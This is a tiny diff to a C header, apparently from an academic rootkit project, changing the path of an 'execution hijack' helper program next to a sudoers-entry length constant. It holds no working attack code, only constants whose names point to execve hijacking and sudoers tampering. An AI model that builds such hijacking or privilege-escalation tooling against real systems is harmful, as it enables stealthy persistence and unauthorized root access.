@@ -19,7 +19,7 @@
 #define STRING_FS_SUDOERS_ENTRY_LEN 37
 
 //EXECUTION HIJACKING
-#define PATH_EXECUTION_HIJACK_PROGRAM "/home/osboxes/TFG/src/helpers/execve_hijack_canalizer\0"
+#define PATH_EXECUTION_HIJACK_PROGRAM "/home/osboxes/TFG/src/helpers/execve_hijack\0"
 
 
 #endif
